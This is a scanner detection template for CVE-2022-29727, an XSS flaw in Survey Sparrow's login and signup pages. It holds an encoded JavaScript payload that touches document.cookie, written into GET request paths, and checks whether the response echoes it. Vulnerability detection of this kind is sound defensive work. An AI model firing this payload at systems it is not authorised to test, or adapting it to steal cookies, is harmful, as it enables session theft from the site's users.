id: CVE-2022-29727

info:
  name: Survey Sparrow Enterprise Survey Software 2022 - Stored Cross-Site Scripting (XSS)
  author:  Pankaj Kumar Thakur
  severity: critical
  description: Survey Sparrow Enterprise Survey Software 2022 在注册参数中存在存储跨站点脚本(XSS)漏洞。
  reference:
    - https://www.exploit-db.com/exploits/50937
    - https://www.tenable.com/cve/CVE-2022-29727

rules:
  r0:
    request:
      method: GET
      path: /login?test=Javascript%26colon;%252F%252F%E2%80%A9confirm?.(document.cookie)//
    expression: response.status == 200  && response.body.bcontains(b'document.cookie')
  r1:
    request:
      method: GET
      path: /signup?test=Javascript%26colon;%252F%252F%E2%80%A9confirm?.(document.cookie)//
    expression: response.status == 200  && response.body.bcontains(b'document.cookie')
expression: r0() || r1()